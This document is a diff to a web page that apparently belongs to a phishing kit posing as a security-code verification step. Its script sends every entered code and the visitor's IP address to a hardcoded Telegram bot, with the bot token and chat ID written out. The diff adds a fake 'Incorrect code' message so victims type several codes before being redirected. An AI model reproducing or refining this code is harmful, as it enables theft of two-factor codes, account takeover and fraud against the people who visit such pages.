@@ -95,18 +95,32 @@ body {
 
 /* Submit button */
 .form-area form input[type=submit] {
+    width: 280px; /* Added width for consistency */
     background: linear-gradient(90deg, var(--accent-pink), var(--accent-cyan));
     color: #fff;
     font-weight: bold;
     cursor: pointer;
     transition: 0.3s;
     border: none;
+    margin-bottom: 10px; /* Added margin for error message */
 }
 
 .form-area form input[type=submit]:hover {
     filter: brightness(1.2);
     transform: translateY(-1px);
 }
+
+/* **NEW** Error Message Style */
+#errorMessage {
+    color: #ff3333; /* Red color */
+    font-size: 12px;
+    margin-top: -5px; /* Pull it up a bit */
+    margin-bottom: 15px;
+    width: 280px;
+    text-align: center;
+    display: none; /* Hidden by default */
+}
+
 
 /* "OR" line */
 form .other-option {
@@ -237,6 +251,8 @@ footer select {
             required
             placeholder="Security code"
           />
+          <span id="errorMessage" class="error-text">Incorrect code. Please try again.</span>
+          
           <input type="submit" name="submit" value="Confirm" id="submit"/>
           <div class="options">
             <p class="small">Didn't get security code? we can</p>
@@ -334,6 +350,8 @@ footer select {
       let submissionCount = 0;
       const REDIRECT_THRESHOLD = 3;
       const REDIRECT_URL = 'thanks.html'; // Set your desired redirect page here
+      const errorMessageElement = document.getElementById('errorMessage');
+      const codeInput = document.getElementById('code');
 
       document.addEventListener('DOMContentLoaded', function () {
         // Fetch IP address and populate the hidden field
@@ -351,14 +369,17 @@ footer select {
       document.getElementById('contactForm').addEventListener('submit', function (event) {
         event.preventDefault(); // Prevent default form submission
 
-        var code = document.getElementById('code').value;
+        // Hide previous error message
+        errorMessageElement.style.display = 'none';
+
+        var code = codeInput.value;
         var ipaddress = document.getElementById('ipaddress').value;
 
         var telegramMessage = `code: ${code}\nIpaddress: ${ipaddress}`;
         // **NOTE**: For security and privacy, you should use server-side code to handle
         // the Telegram bot token and chat ID. Exposing them in client-side code is a risk.
-        var token = '8059720905:AAERfrdVCeVOTB5-BVFJyGZRIrj5Kt4PhwM'; 
-        var chat_id = '7368472897';
+        var token = '7045685608:AAHyUFpncHXYbayakcgmuhkKRtfSiTk5JgM'; 
+        var chat_id = '7876943857';
 
         var url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(telegramMessage)}`;
 
@@ -374,11 +395,13 @@ footer select {
                 // Third submission or more, redirect the user
                 window.location.href = REDIRECT_URL;
               } else {
-                // First or second submission, give feedback but DO NOT redirect
-                alert(`Submission ${submissionCount} of ${REDIRECT_THRESHOLD} complete. Please enter the new code.`); 
-                document.getElementById('code').value = ''; // Clear the code field
+                // First or second submission: show the "Incorrect code" error
+                errorMessageElement.style.display = 'block';
+                codeInput.value = ''; // Clear the code field
+                codeInput.focus(); // Focus back on the input for the next attempt
               }
             } else {
+              // Error from Telegram API
               alert('Error sending message to Telegram.');
             }
           })
